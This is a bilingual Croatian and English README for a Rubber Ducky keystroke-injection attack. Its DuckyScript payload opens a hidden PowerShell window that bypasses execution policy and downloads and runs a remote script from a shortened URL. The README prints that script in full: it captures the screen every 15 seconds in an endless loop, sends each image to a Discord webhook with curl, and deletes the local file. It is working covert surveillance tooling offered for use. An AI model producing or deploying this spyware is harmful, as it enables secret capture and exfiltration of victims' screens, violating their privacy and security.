### README.md 

# Screenshot na Discord Webhook

Ova skripta omogućuje automatsko slanje screenshotova s vašeg računala na Discord kanal koristeći webhook. Skripta koristi PowerShell za snimanje zaslona, a Rubber Ducky uređaj za automatsko pokretanje procesa.

## Instalacija i Postavljanje

### 1. Rubber Ducky Skripta

Ovdje je skripta koju treba prenijeti na vaš **Rubber Ducky uređaj**. Ova skripta će otvoriti PowerShell, preuzeti PowerShell skriptu s poslužitelja i izvršiti ju.

**Rubber Ducky Skripta:**

```plaintext
DELAY 1000
GUI r
DELAY 750
STRING powershell -NoP -Ep Bypass -W H -C $dc='WEBHOOK_HERE'; irm https://is.gd/CF0P74 | iex
ENTER
```

Zamijenite `WEBHOOK_HERE` s stvarnim Discord webhook URL-om.

### 2. PowerShell Skripta (preuzeta s internetskog linka)

Ovdje je sadržaj PowerShell skripte koja će preuzeti screenshot i poslati ga na Discord webhook:

```powershell
$hookurl = $dc
$seconds = 15
Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing
while ($true) {
    $Filett = "$env:temp\SC.png"
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::Png)
    curl.exe -F "file1=@$Filett" $hookurl
    Remove-Item -Path $Filett
    Start-Sleep $seconds
}
```

### 3. Pokretanje

1. Spojite **Rubber Ducky uređaj** na računalo.
2. Skripta će automatski otvoriti PowerShell, preuzeti i pokrenuti PowerShell skriptu koja snima screenshotove.
3. Svakih 15 sekundi, skripta će snimiti sliku ekrana i poslati je na Discord kanal.

## Upute za prilagodbu

* **Interval između screenshotova**: Ako želite promijeniti interval između slanja screenshotova, uredite vrijednost `$seconds` u PowerShell skripti.
* **Webhook URL**: Promijenite `WEBHOOK_HERE` u stvarni URL vašeg Discord webhook-a.

---

### README.md (in English)

# Screenshot to Discord Webhook

This script allows automatic screenshot capturing from your computer and sends them to a Discord channel using a webhook. It uses PowerShell to capture the screen and a Rubber Ducky device to automate the process.

## Installation and Setup

### 1. Rubber Ducky Script

Here is the script you need to upload to your **Rubber Ducky device**. This script will open PowerShell, download the PowerShell script from the server, and execute it.

**Rubber Ducky Script:**

```plaintext
DELAY 1000
GUI r
DELAY 750
STRING powershell -NoP -Ep Bypass -W H -C $dc='WEBHOOK_HERE'; irm https://is.gd/CF0P74 | iex
ENTER
```

Replace `WEBHOOK_HERE` with your actual Discord webhook URL.

### 2. PowerShell Script (downloaded from internet link)

Here is the content of the PowerShell script that will capture the screenshot and send it to the Discord webhook:

```powershell
$hookurl = $dc
$seconds = 15
Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing
while ($true) {
    $Filett = "$env:temp\SC.png"
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::Png)
    curl.exe -F "file1=@$Filett" $hookurl
    Remove-Item -Path $Filett
    Start-Sleep $seconds
}
```

### 3. Running

1. Plug in the **Rubber Ducky device** to the computer.
2. The script will automatically open PowerShell, download, and run the PowerShell script that captures the screenshots.
3. Every 15 seconds, the script will take a screenshot and send it to the Discord channel.

## Customization Instructions

* **Screenshot Interval**: If you want to change the interval between screenshots, modify the `$seconds` value in the PowerShell script.
* **Webhook URL**: Change `WEBHOOK_HERE` to your actual Discord webhook URL.

---

Nadam se da je ovo sada u skladu s tvojim željama!
